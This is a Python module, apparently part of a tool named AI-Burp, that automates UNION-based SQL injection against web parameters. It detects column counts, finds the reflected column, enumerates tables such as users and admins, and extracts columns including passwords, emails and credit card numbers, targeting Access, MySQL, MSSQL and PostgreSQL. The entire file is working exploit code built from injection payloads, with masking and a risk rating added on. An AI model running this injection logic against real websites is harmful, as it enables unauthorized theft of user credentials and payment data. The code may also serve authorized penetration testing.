"""
AI-Burp 数据提取模块 v0.1.0

基于手工测试经验，自动化 UNION 注入数据提取。

功能:
1. 自动检测列数 (ORDER BY / UNION NULL)
2. 自动检测回显列
3. 表名枚举
4. 列名枚举
5. 数据提取 (带脱敏)

支持数据库:
- Microsoft Access (JET)
- MySQL
- MSSQL
- PostgreSQL
"""

import re
import time
import urllib.parse
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Tuple
from ..sync_wrapper import SyncBurp as Burp
from ..burp import Response


@dataclass
class ExtractionResult:
    """数据提取结果"""
    url: str
    param: str
    db_type: str = ""
    columns: int = 0
    echo_column: int = 0
    tables: List[str] = field(default_factory=list)
    table_columns: Dict[str, List[str]] = field(default_factory=dict)
    extracted_data: Dict[str, List[Dict]] = field(default_factory=dict)
    risk_level: str = "低"
    risk_factors: List[str] = field(default_factory=list)
    
    def __str__(self):
        lines = [
            "=" * 60,
            "📊 数据提取报告",
            "=" * 60,
            f"目标: {self.url}",
            f"参数: {self.param}",
            f"数据库: {self.db_type}",
            f"列数: {self.columns}",
            f"回显列: {self.echo_column}",
            "",
            f"📋 发现的表: {', '.join(self.tables) if self.tables else '无'}",
        ]
        
        if self.table_columns:
            lines.append("")
            lines.append("📋 表结构:")
            for table, cols in self.table_columns.items():
                lines.append(f"  {table}: {', '.join(cols)}")
        
        if self.extracted_data:
            lines.append("")
            lines.append("📋 提取的数据样本:")
            for table, rows in self.extracted_data.items():
                lines.append(f"  {table}:")
                for row in rows[:5]:  # 最多显示5条
                    lines.append(f"    {row}")
        
        lines.append("")
        lines.append("=" * 60)
        lines.append(f"⚠️ 风险等级: {self.risk_level}")
        if self.risk_factors:
            lines.append(f"风险因素: {', '.join(self.risk_factors)}")
        lines.append("=" * 60)
        
        return "\n".join(lines)


class DataExtractor:
    """
    数据提取器
    
    用法:
        extractor = DataExtractor(burp)
        result = extractor.extract("http://target.com/product.asp", "pid", "118", db_type="access")
        print(result)
    """
    
    # 常见表名
    COMMON_TABLES = [
        'users', 'user', 'members', 'member', 'customers', 'customer',
        'admin', 'admins', 'administrator', 'administrators',
        'orders', 'order', 'products', 'product', 'items', 'item',
        'cart', 'carts', 'shopping_cart',
        'accounts', 'account', 'login', 'logins',
        'payments', 'payment', 'transactions', 'transaction',
        'categories', 'category',
    ]
    
    # 敏感列名 (优先检测)
    SENSITIVE_COLUMNS = {
        'high': ['password', 'pass', 'pwd', 'credit_card', 'cc_number', 'card_number', 'cvv'],
        'medium': ['email', 'user_email', 'phone', 'address'],
        'low': ['username', 'user_name', 'name'],
    }
    
    # 常见列名 (精简版)
    COMMON_COLUMNS = [
        'id', 'user_id', 'username', 'name', 'email', 'user_email',
        'password', 'pass', 'pwd', 'phone', 'address',
        'price', 'total', 'status',
        'credit_card', 'card_number',
        'order_id', 'product_id',
    ]
    
    def __init__(self, burp: Burp):
        self.burp = burp
    
    def _send(self, url: str, param: str, value: str) -> Response:
        """发送 GET 请求"""
        return self.burp._send_param(url, param, value, "GET")
    
    def _detect_columns_orderby(self, url: str, param: str, value: str) -> int:
        """使用 ORDER BY 检测列数"""
        print("   使用 ORDER BY 检测列数...")
        
        # 获取基线响应
        baseline = self._send(url, param, value)
        baseline_error_code = ""
        if baseline.body:
            match = re.search(r"error '([0-9a-fA-F]{8})'", baseline.body, re.I)
            if match:
                baseline_error_code = match.group(1).lower()
        
        for cols in range(1, 30):
            payload = f"{value} ORDER BY {cols}"
            r = self._send(url, param, payload)
            
            # 检查错误代码变化 (Access 特征)
            if r.body:
                match = re.search(r"error '([0-9a-fA-F]{8})'", r.body, re.I)
                if match:
                    error_code = match.group(1).lower()
                    # 80040e14 是 JET SQL 语法错误
                    if error_code == '80040e14' and error_code != baseline_error_code:
                        if cols > 1:
                            print(f"   ✅ ORDER BY 确定列数: {cols - 1}")
                            return cols - 1
                        break
            
            # 检查是否触发其他错误
            if r.status >= 400 or ('error' in r.body.lower() and 'error' not in baseline.body.lower()):
                if cols > 1:
                    print(f"   ✅ ORDER BY 确定列数: {cols - 1}")
                    return cols - 1
                break
            
            time.sleep(self.burp.delay * 0.3)
        
        return 0
    
    def _detect_columns_union(self, url: str, param: str, value: str, db_type: str) -> int:
        """使用 UNION 检测列数"""
        print("   使用 UNION 检测列数...")
        
        # 获取基线响应
        baseline = self._send(url, param, value)
        
        for cols in range(1, 30):
            if db_type == 'access':
                # Access 需要数字和 FROM 子句，尝试多个表
                values = ','.join([str(i) for i in range(1, cols + 1)])
                # 尝试不同的表
                for table in ['users', 'products', 'orders', 'MSysObjects']:
                    payload = f"0 UNION SELECT {values} FROM {table}"
                    r = self._send(url, param, payload)
                    
                    # 如果响应正常且大小明显变化，找到了正确列数
                    if r.status == 200 and r.length > baseline.length + 1000:
                        print(f"   ✅ UNION 确定列数: {cols} (表: {table})")
                        return cols
                    
                    time.sleep(self.burp.delay * 0.2)
            else:
                # 其他数据库用 NULL
                nulls = ','.join(['NULL'] * cols)
                payload = f"{value}' UNION SELECT {nulls}--"
                r = self._send(url, param, payload)
                
                # 如果响应正常且大小变化，可能找到了正确列数
                if r.status == 200 and r.length > baseline.length + 500:
                    print(f"   ✅ UNION 确定列数: {cols}")
                    return cols
            
            time.sleep(self.burp.delay * 0.3)
        
        return 0
    
    def _detect_echo_column(self, url: str, param: str, columns: int, db_type: str) -> int:
        """检测回显列"""
        print("   检测回显列...")
        
        marker = "AIBURP12345"
        
        # 获取基线响应
        baseline = self._send(url, param, "0")
        
        for col in range(1, columns + 1):
            if db_type == 'access':
                values = []
                for i in range(1, columns + 1):
                    if i == col:
                        values.append(f"'{marker}'")
                    else:
                        values.append(str(i))
                # 尝试不同的表
                for table in ['users', 'products', 'orders']:
                    payload = f"0 UNION SELECT {','.join(values)} FROM {table}"
                    r = self._send(url, param, payload)
                    
                    if marker in r.body:
                        print(f"   ✅ 回显列: {col}")
                        return col
                    
                    time.sleep(self.burp.delay * 0.2)
            else:
                values = ['NULL'] * columns
                values[col - 1] = f"'{marker}'"
                payload = f"0' UNION SELECT {','.join(values)}--"
                r = self._send(url, param, payload)
                
                if marker in r.body:
                    print(f"   ✅ 回显列: {col}")
                    return col
            
            time.sleep(self.burp.delay * 0.3)
        
        # 如果没找到，默认返回第一个可能的列
        print("   ⚠️ 未检测到明确回显列，尝试列 5")
        return 5  # Access 常见回显列
    
    def _enumerate_tables(self, url: str, param: str, columns: int, echo_col: int, db_type: str) -> List[str]:
        """枚举表名"""
        print("   枚举表名...")
        
        found_tables = []
        
        for table in self.COMMON_TABLES:
            if db_type == 'access':
                values = [str(i) for i in range(1, columns + 1)]
                payload = f"0 UNION SELECT {','.join(values)} FROM {table}"
            else:
                values = ['NULL'] * columns
                payload = f"0' UNION SELECT {','.join(values)} FROM {table}--"
            
            r = self._send(url, param, payload)
            
            # 如果响应正常，表存在
            if r.status == 200 and r.length > 5000:
                found_tables.append(table)
                print(f"      ✅ {table}")
            
            time.sleep(self.burp.delay * 0.3)
        
        return found_tables
    
    def _enumerate_columns(self, url: str, param: str, table: str, columns: int, echo_col: int, db_type: str) -> List[str]:
        """枚举表的列名"""
        found_cols = []
        
        for col in self.COMMON_COLUMNS:
            if db_type == 'access':
                values = [str(i) for i in range(1, columns + 1)]
                values[echo_col - 1] = col
                payload = f"0 UNION SELECT {','.join(values)} FROM {table}"
            else:
                values = ['NULL'] * columns
                values[echo_col - 1] = col
                payload = f"0' UNION SELECT {','.join(values)} FROM {table}--"
            
            r = self._send(url, param, payload)
            
            if r.status == 200 and r.length > 5000:
                found_cols.append(col)
            
            time.sleep(self.burp.delay * 0.2)
        
        return found_cols
    
    def _extract_data(self, url: str, param: str, table: str, col: str, 
                      columns: int, echo_col: int, db_type: str) -> List[str]:
        """提取单列数据"""
        if db_type == 'access':
            # 使用 chr() 标记来定位数据
            values = [str(i) for i in range(1, columns + 1)]
            values[echo_col - 1] = f"chr(65)&chr(65)&chr(65)&{col}&chr(66)&chr(66)&chr(66)"
            payload = f"0 UNION SELECT {','.join(values)} FROM {table}"
        else:
            values = ['NULL'] * columns
            values[echo_col - 1] = f"CONCAT('AAA',{col},'BBB')"
            payload = f"0' UNION SELECT {','.join(values)} FROM {table}--"
        
        r = self._send(url, param, payload)
        
        if r.status == 200:
            # 提取 AAA...BBB 之间的数据
            matches = re.findall(r'AAA([^B]*)BBB', r.body)
            return [m.strip() for m in matches if m.strip()]
        
        return []
    
    def _mask_sensitive_data(self, data: str, col_name: str) -> str:
        """脱敏敏感数据"""
        if not data:
            return data
        
        # 邮箱脱敏
        if '@' in data:
            parts = data.split('@')
            if len(parts) == 2:
                return parts[0][:2] + '***@' + parts[1]
        
        # 密码脱敏
        if col_name.lower() in ['password', 'pass', 'pwd', 'passwd']:
            return '*' * len(data)
        
        # 信用卡脱敏
        if col_name.lower() in ['credit_card', 'cc_number', 'card_number']:
            if len(data) >= 4:
                return '*' * (len(data) - 4) + data[-4:]
        
        # 长数字脱敏
        if len(data) > 4 and data.isdigit():
            return data[:2] + '***' + data[-2:]
        
        return data
    
    def _assess_risk(self, result: ExtractionResult):
        """评估风险等级"""
        risk_level = "低"
        risk_factors = []
        
        for table, cols in result.table_columns.items():
            for col in cols:
                col_lower = col.lower()
                
                # 高危
                if col_lower in self.SENSITIVE_COLUMNS['high']:
                    risk_factors.append(f"{table}.{col} (高危)")
                    risk_level = "严重"
                
                # 中危
                elif col_lower in self.SENSITIVE_COLUMNS['medium']:
                    risk_factors.append(f"{table}.{col} (中危)")
                    if risk_level not in ["严重", "高"]:
                        risk_level = "中"
                
                # 低危
                elif col_lower in self.SENSITIVE_COLUMNS['low']:
                    if risk_level == "低":
                        risk_factors.append(f"{table}.{col} (低危)")
        
        # 检查提取的数据
        for table, rows in result.extracted_data.items():
            for row in rows:
                for col, val in row.items():
                    if '@' in str(val):
                        if "用户邮箱" not in risk_factors:
                            risk_factors.append("用户邮箱泄露")
                        if risk_level == "低":
                            risk_level = "中"
        
        result.risk_level = risk_level
        result.risk_factors = risk_factors
    
    def extract(
        self, 
        url: str, 
        param: str, 
        value: str, 
        db_type: str = "auto",
        tables: List[str] = None,
        max_rows: int = 10
    ) -> ExtractionResult:
        """
        自动提取数据
        
        Args:
            url: 目标 URL
            param: 注入参数
            value: 参数值
            db_type: 数据库类型 (auto/access/mysql/mssql/postgresql)
            tables: 指定要提取的表 (None = 自动枚举)
            max_rows: 最大提取行数
        
        Returns:
            ExtractionResult 对象
        """
        result = ExtractionResult(url=url, param=param)
        
        print("=" * 60)
        print("🔍 AI-Burp 数据提取")
        print("=" * 60)
        print(f"目标: {url}")
        print(f"参数: {param}")
        print("")
        
        # 1. 检测数据库类型
        if db_type == "auto":
            print("📊 检测数据库类型...")
            # 简单检测: 发送单引号看错误信息
            r = self._send(url, param, f"{value}'")
            if 'JET' in r.body or 'Access' in r.body or '80040e14' in r.body:
                db_type = "access"
            elif 'MySQL' in r.body or 'mysql' in r.body:
                db_type = "mysql"
            elif 'SQL Server' in r.body or 'ODBC' in r.body:
                db_type = "mssql"
            elif 'PostgreSQL' in r.body:
                db_type = "postgresql"
            else:
                db_type = "mysql"  # 默认
            print(f"   检测到: {db_type}")
        
        result.db_type = db_type
        
        # 2. 检测列数
        print("\n📊 检测列数...")
        columns = self._detect_columns_orderby(url, param, value)
        if columns == 0:
            columns = self._detect_columns_union(url, param, value, db_type)
        
        if columns == 0:
            print("   ❌ 无法检测列数")
            return result
        
        result.columns = columns
        
        # 3. 检测回显列
        echo_col = self._detect_echo_column(url, param, columns, db_type)
        if echo_col == 0:
            print("   ❌ 无法检测回显列")
            return result
        
        result.echo_column = echo_col
        
        # 4. 枚举表
        print("\n📊 枚举表...")
        if tables:
            result.tables = tables
        else:
            result.tables = self._enumerate_tables(url, param, columns, echo_col, db_type)
        
        if not result.tables:
            print("   ❌ 未发现表")
            return result
        
        # 5. 枚举列
        print("\n📊 枚举列...")
        for table in result.tables[:5]:  # 最多枚举5个表
            print(f"   {table}:")
            cols = self._enumerate_columns(url, param, table, columns, echo_col, db_type)
            if cols:
                result.table_columns[table] = cols
                print(f"      {', '.join(cols)}")
        
        # 6. 提取数据样本
        print("\n📊 提取数据样本...")
        for table, cols in result.table_columns.items():
            print(f"   {table}:")
            table_data = []
            
            for col in cols[:5]:  # 每表最多提取5列
                data = self._extract_data(url, param, table, col, columns, echo_col, db_type)
                if data:
                    for d in data[:max_rows]:
                        masked = self._mask_sensitive_data(d, col)
                        print(f"      {col}: {masked}")
                        # 添加到结果
                        found = False
                        for row in table_data:
                            if col not in row:
                                row[col] = masked
                                found = True
                                break
                        if not found:
                            table_data.append({col: masked})
            
            if table_data:
                result.extracted_data[table] = table_data
        
        # 7. 风险评估
        print("\n📊 风险评估...")
        self._assess_risk(result)
        
        return result


def extract_command(burp: Burp, url: str, param: str, value: str, 
                    db_type: str = "auto", tables: str = None) -> str:
    """提取命令入口"""
    extractor = DataExtractor(burp)
    
    table_list = None
    if tables:
        table_list = [t.strip() for t in tables.split(",")]
    
    result = extractor.extract(url, param, value, db_type=db_type, tables=table_list)
    return str(result)
